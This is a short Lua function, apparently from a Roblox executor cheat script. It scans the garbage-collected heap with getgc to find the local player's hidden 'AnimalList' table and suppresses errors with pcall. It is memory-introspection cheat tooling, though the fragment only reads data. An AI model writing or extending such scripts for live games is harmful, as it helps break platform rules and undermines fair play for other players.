local function getMyAnimalListSafe()
    local myList = nil
    pcall(function()
        for _, v in pairs(getgc(true)) do
            if type(v) == "table" and rawget(v, "AnimalList") then
                local owner = rawget(v, "Owner")
                if not owner and type(rawget(v, "Get")) == "function" then
                    pcall(function() owner = v:Get("Owner") end)
                end
                if owner == LP or (type(owner) == "table" and owner.UserId == LP.UserId) then
                    myList = rawget(v, "AnimalList")
                    if not myList and type(rawget(v, "Get")) == "function" then
                        pcall(function() myList = v:Get("AnimalList") end)
                    end
                    if myList then break end
                end
            end
        end
    end)
    return myList
end

